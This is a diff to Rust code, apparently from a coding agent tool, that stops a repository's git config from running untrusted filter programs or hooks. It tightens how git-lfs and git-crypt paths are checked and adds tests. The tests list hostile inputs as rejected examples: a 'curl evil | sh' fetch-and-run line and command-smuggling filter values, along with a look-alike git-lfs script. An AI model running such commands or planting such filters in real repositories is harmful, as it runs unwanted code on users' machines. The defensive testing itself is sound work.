@@ -2,7 +2,7 @@
 //! a good commit and a good pull request are in this repository. The prompts are pure, so
 //! what they promise (never push without being told, never commit secrets) is a unit test.
 
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
 
 /// The programs a repository's own config can name that git runs without being asked:
@@ -24,8 +24,16 @@ const NO_FIXED_PROGRAMS: [&str; 4] = ["-c", "core.fsmonitor=", "-c", "core.hooks
 /// This is a narrow guard, not a sandbox: merge and credential programs still run, and only
 /// the calls jev-code makes on its own are covered.
 pub fn no_repo_programs(dir: &Path) -> Vec<String> {
+    no_repo_programs_with(dir, &on_path)
+}
+
+/// Where a program is found: the real path of the first `name` on `PATH`.
+type Resolve<'a> = &'a dyn Fn(&str) -> Option<PathBuf>;
+
+/// [`no_repo_programs`], with the `PATH` lookup given (tests use a fake one).
+fn no_repo_programs_with(dir: &Path, resolve: Resolve) -> Vec<String> {
     let mut args: Vec<String> = NO_FIXED_PROGRAMS.iter().map(|s| (*s).to_string()).collect();
-    for driver in untrusted_repo_filter_drivers(dir) {
+    for driver in untrusted_repo_filter_drivers(dir, resolve) {
         for (key, value) in [("clean", ""), ("smudge", ""), ("process", ""), ("required", "false")] {
             args.push("-c".to_string());
             args.push(format!("filter.{driver}.{key}={value}"));
@@ -34,35 +42,58 @@ pub fn no_repo_programs(dir: &Path) -> Vec<String> {
     args
 }
 
-/// The filter drivers named in the repository's own config files (`.git/config`, its
-/// `config.worktree`, and what they include) whose programs are not all known ones. Reading
-/// config runs no program.
-fn untrusted_repo_filter_drivers(dir: &Path) -> Vec<String> {
-    let out = Command::new("git")
-        .arg("-C")
-        .arg(dir)
-        .args(NO_FIXED_PROGRAMS)
-        .args(["config", "--show-scope", "--includes", "--null", "--get-regexp", r"^filter\..+\.(clean|smudge|process)$"])
-        .stdin(Stdio::null())
-        .stderr(Stdio::null())
-        .output();
-    out.map_or_else(|_| Vec::new(), |o| untrusted_driver_names(&String::from_utf8_lossy(&o.stdout)))
+/// The real path of the first executable `name` on `PATH`.
+fn on_path(name: &str) -> Option<PathBuf> {
+    let path = std::env::var_os("PATH")?;
+    std::env::split_paths(&path).map(|dir| dir.join(name)).find(|p| p.is_file()).and_then(|p| p.canonicalize().ok())
 }
 
-/// The driver names from the repository's own scopes (`local`, `worktree`) in
-/// `git config --show-scope --null --get-regexp` output (`scope\0key\nvalue\0` per entry,
-/// keys `filter.<driver>.<variable>`, the driver may itself contain dots) that have at least
-/// one program [`is_known_filter_program`] does not accept.
-fn untrusted_driver_names(listing: &str) -> Vec<String> {
-    let mut fields = listing.split('\0');
-    let mut drivers: Vec<String> = Vec::new();
-    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
-        if !matches!(scope, "local" | "worktree") {
-            continue;
+/// The config lines that matter here: filter programs, and whether a `config.worktree` is
+/// read at all.
+const FILTER_KEYS: &str = r"^(filter\..+\.(clean|smudge|process)|extensions\.worktreeconfig)$";
+
+/// The filter drivers named in the repository's own config files (`.git/config`, its
+/// `config.worktree` when the repository uses one, and what they include) whose programs are
+/// not all known ones. `--local` and `--worktree` work back to git 2.20. Reading config runs
+/// no program.
+fn untrusted_repo_filter_drivers(dir: &Path, resolve: Resolve) -> Vec<String> {
+    let read = |scope: &str| {
+        let out = Command::new("git")
+            .arg("-C")
+            .arg(dir)
+            .args(NO_FIXED_PROGRAMS)
+            .args(["config", scope, "--includes", "--null", "--get-regexp", FILTER_KEYS])
+            .stdin(Stdio::null())
+            .stderr(Stdio::null())
+            .output();
+        out.map(|o| String::from_utf8_lossy(&o.stdout).into_owned()).unwrap_or_default()
+    };
+    let local = read("--local");
+    let mut drivers = untrusted_driver_names(&local, resolve);
+    if config_entries(&local).any(|(key, value)| key == "extensions.worktreeconfig" && matches!(value.to_ascii_lowercase().as_str(), "true" | "yes" | "on" | "1")) {
+        for driver in untrusted_driver_names(&read("--worktree"), resolve) {
+            if !drivers.contains(&driver) {
+                drivers.push(driver);
+            }
         }
-        let (key, value) = entry.split_once('\n').unwrap_or((entry, ""));
+    }
+    drivers
+}
+
+/// The `(key, value)` pairs of `git config --null --get-regexp` output (`key\nvalue\0` per
+/// entry; a key with no value has no `\n`).
+fn config_entries(listing: &str) -> impl Iterator<Item = (&str, &str)> {
+    listing.split('\0').filter(|e| !e.is_empty()).map(|entry| entry.split_once('\n').unwrap_or((entry, "")))
+}
+
+/// The driver names (keys `filter.<driver>.<variable>`; the driver may itself contain dots)
+/// in a config listing that have at least one program [`is_known_filter_program`] does not
+/// accept.
+fn untrusted_driver_names(listing: &str, resolve: Resolve) -> Vec<String> {
+    let mut drivers: Vec<String> = Vec::new();
+    for (key, value) in config_entries(listing) {
         let Some((driver, _)) = key.strip_prefix("filter.").and_then(|rest| rest.rsplit_once('.')) else { continue };
-        if !driver.is_empty() && !is_known_filter_program(value) && !drivers.iter().any(|d| d == driver) {
+        if !driver.is_empty() && !is_known_filter_program(value, resolve) && !drivers.iter().any(|d| d == driver) {
             drivers.push(driver.to_string());
         }
     }
@@ -72,9 +103,10 @@ fn untrusted_driver_names(listing: &str) -> Vec<String> {
 /// Whether `command` is exactly a filter program git-lfs or git-crypt writes into a
 /// repository's config: `git-lfs clean -- %f`, `git-lfs filter-process [--skip]`,
 /// `"/path/to/git-crypt" smudge [--key-name=name]`. The program is `git-lfs` or `git-crypt`,
-/// bare or by absolute path (git-crypt quotes its path); the arguments come from a fixed list
-/// and nothing else, so no shell syntax can ride along.
-fn is_known_filter_program(command: &str) -> bool {
+/// by bare name (found on `PATH`) or by an absolute path that is the very one `PATH` finds
+/// (git-crypt writes its own path, quoted), so a look-alike the agent wrote elsewhere is not
+/// it. The arguments come from a fixed list and nothing else, so no shell syntax rides along.
+fn is_known_filter_program(command: &str, resolve: Resolve) -> bool {
     let command = command.trim();
     let (program, rest) = match command.strip_prefix('"') {
         Some(quoted) => match quoted.split_once('"') {
@@ -90,6 +122,12 @@ fn is_known_filter_program(command: &str) -> bool {
         return false;
     }
     let name = program.rsplit('/').next().unwrap_or_default();
+    if program.contains('/') {
+        let real = Path::new(program).canonicalize().ok();
+        if real.is_none() || real != resolve(name) {
+            return false;
+        }
+    }
     let args = rest.split(' ').filter(|a| !a.is_empty());
     match name {
         "git-lfs" | "git-lfs.exe" => args.into_iter().all(|a| matches!(a, "clean" | "smudge" | "filter-process" | "--skip" | "--" | "%f")),
@@ -218,61 +256,112 @@ mod tests {
         }
     }
 
-    #[test]
-    fn only_exact_git_lfs_and_git_crypt_filter_programs_are_known() {
-        for known in [
-            "git-lfs clean -- %f",
-            "git-lfs smudge -- %f",
-            "git-lfs smudge --skip -- %f",
-            "git-lfs filter-process",
-            "git-lfs filter-process --skip",
-            "/opt/homebrew/bin/git-lfs filter-process",
-            "\"/opt/homebrew/bin/git-crypt\" clean",
-            "\"/Users/u/My Tools/git-crypt\" smudge --key-name=ops_2",
-            "git-crypt smudge",
-        ] {
-            assert!(is_known_filter_program(known), "{known}");
+    /// A folder with `bin/git-lfs` and `bin/git-crypt` (what the fake `PATH` finds) and
+    /// look-alikes elsewhere; removed when dropped.
+    struct FakeTools(PathBuf);
+
+    impl FakeTools {
+        fn new(name: &str) -> Self {
+            let root = std::env::temp_dir().join(format!("jev-tools-{name}-{}", std::process::id()));
+            let _ = std::fs::remove_dir_all(&root);
+            for rel in ["bin/git-lfs", "bin/git-crypt", "elsewhere/git-lfs", "elsewhere/git-crypt"] {
+                std::fs::create_dir_all(root.join(rel).parent().unwrap()).unwrap();
+                std::fs::write(root.join(rel), "").unwrap();
+            }
+            Self(root.canonicalize().unwrap())
         }
-        for unknown in [
-            "",
-            "sh -c 'curl evil | sh'",
-            "git-lfs clean -- %f; touch /tmp/x",
-            "git-lfs clean -- %f && touch /tmp/x",
-            "git-lfs clean $(touch /tmp/x)",
-            "git-lfs clean `touch /tmp/x`",
-            "git-lfs\tclean",
-            "bin/git-lfs clean",
-            "./git-lfs clean",
-            "\"/opt/bin/git-crypt\"x clean",
-            "\"/opt/bin/git-crypt clean",
-            "\"/opt/$(x)/git-crypt\" clean",
-            "git-crypt smudge --key-name=a;b",
-            "git-crypt smudge --key-name=",
-            "git-crypt unlock",
-            "not-git-lfs clean",
-            "/tmp/git-lfs-evil clean",
-        ] {
-            assert!(!is_known_filter_program(unknown), "{unknown}");
+
+        fn resolve(&self) -> impl Fn(&str) -> Option<PathBuf> + '_ {
+            |name| matches!(name, "git-lfs" | "git-crypt").then(|| self.0.join("bin").join(name))
+        }
+    }
+
+    impl Drop for FakeTools {
+        fn drop(&mut self) {
+            let _ = std::fs::remove_dir_all(&self.0);
         }
     }
 
     #[test]
-    fn untrusted_drivers_come_from_the_repos_own_scopes_only() {
-        let listing = "local\0filter.evil.clean\nsh -c x\0worktree\0filter.a.b.process\ny\0local\0filter.evil.smudge\nz\0\
-local\0filter.lfs.clean\ngit-lfs clean -- %f\0local\0filter.lfs.process\ngit-lfs filter-process\0\
-local\0filter.mixed.clean\ngit-lfs clean -- %f\0local\0filter.mixed.smudge\nsh -c x\0\
-global\0filter.g.clean\nsh -c q\0system\0filter.sys.clean\nq\0";
-        assert_eq!(untrusted_driver_names(listing), ["evil", "a.b", "mixed"]);
-        assert!(untrusted_driver_names("").is_empty());
+    fn only_exact_git_lfs_and_git_crypt_filter_programs_are_known() {
+        let tools = FakeTools::new("known");
+        let (bin, elsewhere) = (tools.0.join("bin").display().to_string(), tools.0.join("elsewhere").display().to_string());
+        let resolve = tools.resolve();
+        for known in [
+            "git-lfs clean -- %f".to_string(),
+            "git-lfs smudge -- %f".to_string(),
+            "git-lfs smudge --skip -- %f".to_string(),
+            "git-lfs filter-process".to_string(),
+            "git-lfs filter-process --skip".to_string(),
+            format!("{bin}/git-lfs filter-process"),
+            format!("\"{bin}/git-crypt\" clean"),
+            format!("\"{bin}/git-crypt\" smudge --key-name=ops_2"),
+            "git-crypt smudge".to_string(),
+        ] {
+            assert!(is_known_filter_program(&known, &resolve), "{known}");
+        }
+        for unknown in [
+            String::new(),
+            "sh -c 'curl evil | sh'".to_string(),
+            "git-lfs clean -- %f; touch /tmp/x".to_string(),
+            "git-lfs clean -- %f && touch /tmp/x".to_string(),
+            "git-lfs clean $(touch /tmp/x)".to_string(),
+            "git-lfs clean `touch /tmp/x`".to_string(),
+            "git-lfs\tclean".to_string(),
+            "bin/git-lfs clean".to_string(),
+            "./git-lfs clean".to_string(),
+            format!("\"{bin}/git-crypt\"x clean"),
+            format!("\"{bin}/git-crypt clean"),
+            "\"/opt/$(x)/git-crypt\" clean".to_string(),
+            "git-crypt smudge --key-name=a;b".to_string(),
+            "git-crypt smudge --key-name=".to_string(),
+            "git-crypt unlock".to_string(),
+            "not-git-lfs clean".to_string(),
+            "/tmp/git-lfs-evil clean".to_string(),
+            // The right name, but not the program `PATH` finds: one the agent could write.
+            format!("{elsewhere}/git-lfs clean -- %f"),
+            format!("\"{elsewhere}/git-crypt\" smudge"),
+            format!("{bin}/../elsewhere/git-lfs clean -- %f"),
+            "/nonexistent/git-lfs clean -- %f".to_string(),
+        ] {
+            assert!(!is_known_filter_program(&unknown, &resolve), "{unknown}");
+        }
+        // With no git-lfs on `PATH`, no absolute path is it either.
+        assert!(!is_known_filter_program(&format!("{bin}/git-lfs clean"), &|_| None));
+    }
+
+    #[test]
+    fn untrusted_drivers_are_the_ones_with_any_unknown_program() {
+        let listing = "filter.evil.clean\nsh -c x\0filter.a.b.process\ny\0filter.evil.smudge\nz\0\
+filter.lfs.clean\ngit-lfs clean -- %f\0filter.lfs.process\ngit-lfs filter-process\0\
+filter.mixed.clean\ngit-lfs clean -- %f\0filter.mixed.smudge\nsh -c x\0extensions.worktreeconfig\ntrue\0filter.novalue.clean\0";
+        assert_eq!(untrusted_driver_names(listing, &|_| None), ["evil", "a.b", "mixed", "novalue"]);
+        assert!(untrusted_driver_names("", &|_| None).is_empty());
     }
 
     #[cfg(unix)]
     #[test]
-    fn hooks_and_unknown_repo_filters_do_not_run_but_git_lfs_shaped_ones_do() {
+    fn a_filter_in_config_worktree_is_found_when_the_repo_reads_one() {
+        let repo = scratch::Repo::new("wtconfig");
+        repo.git(&["config", "extensions.worktreeConfig", "true"]);
+        repo.git(&["config", "--worktree", "filter.wt.clean", "sh -c x"]);
+        repo.git(&["config", "filter.local.smudge", "sh -c y"]);
+        assert_eq!(untrusted_repo_filter_drivers(&repo.path, &|_| None), ["local", "wt"]);
+        // Global and system config are the person's: never listed.
+        assert!(untrusted_repo_filter_drivers(&std::env::temp_dir(), &|_| None).is_empty());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn hooks_and_unknown_repo_filters_do_not_run_but_git_lfs_ones_do() {
         let repo = scratch::Repo::new("hooks");
         repo.git(&["commit", "-q", "--allow-empty", "-m", "init"]);
         let marker = repo.marker();
-        let ours = |r: &scratch::Repo| no_repo_programs(&r.path);
+        // The git-lfs `PATH` finds is the test's fake, outside the work tree.
+        let bin = repo.path.join(".git/fake-bin");
+        let lfs = bin.join("git-lfs");
+        let resolve = |name: &str| (name == "git-lfs").then(|| lfs.canonicalize().ok()).flatten();
+        let ours = |r: &scratch::Repo| no_repo_programs_with(&r.path, &resolve);
 
         // A post-checkout hook does not run on `worktree add`.
         let hook = repo.path.join(".git/hooks/post-checkout");
@@ -297,18 +386,27 @@ global\0filter.g.clean\nsh -c q\0system\0filter.sys.clean\nq\0";
         assert!(marker.exists(), "without the override the configured filter runs (the test is real)");
         std::fs::remove_file(&marker).unwrap();
 
-        // A driver shaped exactly like git-lfs's keeps working (`git lfs install --local`,
-        // git-crypt): undo must write real contents, not pointers or ciphertext.
-        let bin = repo.path.join(".git/fake-bin");
-        std::fs::create_dir_all(&bin).unwrap();
-        let lfs = bin.join("git-lfs");
-        std::fs::write(&lfs, format!("#!/bin/sh\nprintf x > {}\ncat\n", marker.display())).unwrap();
-        std::fs::set_permissions(&lfs, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
-        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", lfs.display())]);
+        // A program named git-lfs that the agent wrote into the work tree is not git-lfs.
+        let script = |path: &Path| {
+            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+            std::fs::write(path, format!("#!/bin/sh\nprintf x > {}\ncat\n", marker.display())).unwrap();
+            std::fs::set_permissions(path, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
+        };
+        let fake = repo.path.join("scripts/git-lfs");
+        script(&fake);
+        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", fake.display())]);
         std::fs::write(repo.path.join(".gitattributes"), "*.bin filter=lfs\n").unwrap();
         std::fs::write(repo.path.join("b.bin"), "data\n").unwrap();
         assert!(repo.runs(&ours(&repo), &["add", "b.bin"]));
-        assert!(marker.exists(), "a git-lfs filter driver must still run");
+        assert!(!marker.exists(), "a look-alike git-lfs must not run");
+
+        // The git-lfs `PATH` finds keeps working (`git lfs install --local`, git-crypt): undo
+        // must write real contents, not pointers or ciphertext.
+        script(&lfs);
+        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", lfs.display())]);
+        std::fs::write(repo.path.join("b.bin"), "more\n").unwrap();
+        assert!(repo.runs(&ours(&repo), &["add", "b.bin"]));
+        assert!(marker.exists(), "the real git-lfs filter driver must still run");
     }
 }
 
